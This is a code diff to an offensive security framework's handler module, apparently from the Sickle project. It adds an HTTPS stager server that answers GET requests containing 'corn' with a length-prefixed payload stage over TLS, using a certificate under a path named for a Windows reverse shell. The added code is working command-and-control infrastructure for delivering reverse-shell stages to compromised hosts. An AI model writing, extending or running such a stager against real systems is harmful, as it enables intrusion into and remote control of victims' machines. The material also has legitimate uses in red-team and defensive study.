@@ -1,14 +1,25 @@
 import os
 import sys
+import ssl
 import time
 import struct
 import socket
 import threading
+import http.server
 import socketserver
 
 from sickle.common.lib.generic import modparser
 
 time_start = time.time()
+
+class HTTPSStagerHandler(http.server.BaseHTTPRequestHandler):
+
+    def do_GET(self):
+
+        if ("corn" in self.path):
+            log_print(f"Sending stage ({len(self.server.stage)} bytes) to {self.client_address[0]}")
+            self.wfile.write(struct.pack('<Q', len(self.server.stage)))
+            self.wfile.write(self.server.stage)
 
 class TCPStagerHandler(socketserver.StreamRequestHandler):
 
@@ -111,9 +122,30 @@ class Module():
             self.start_tty_handler()
         elif self.handler == "tcp":
             self.start_tcp_handler()
+        elif self.handler == "https":
+            self.start_https_handler()
         else:
             print(f"{self.handler} is not a valid handler")
             exit(-1)
+
+    def start_https_handler(self):
+        
+        s_addr = (self.srvhost, self.srvport)
+        httpd = http.server.HTTPServer(s_addr, HTTPSStagerHandler)
+        log_print(f"HTTPSStagerHandler started, serving payloads @{{{self.srvhost}:{self.srvport}}}")
+
+        sslctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+        sslctx.check_hostname = False
+        sslctx.load_cert_chain(certfile='/opt/Sickle-Windows-Reverse-Shell/src/sickle/modules/de_cert.pem',
+                               keyfile=None,
+                               password=None)
+
+        httpd.socket = sslctx.wrap_socket(httpd.socket,
+                                          server_side=True)
+
+        httpd.stage = self.stage
+
+        httpd.serve_forever()
 
     def start_tcp_handler(self):
 
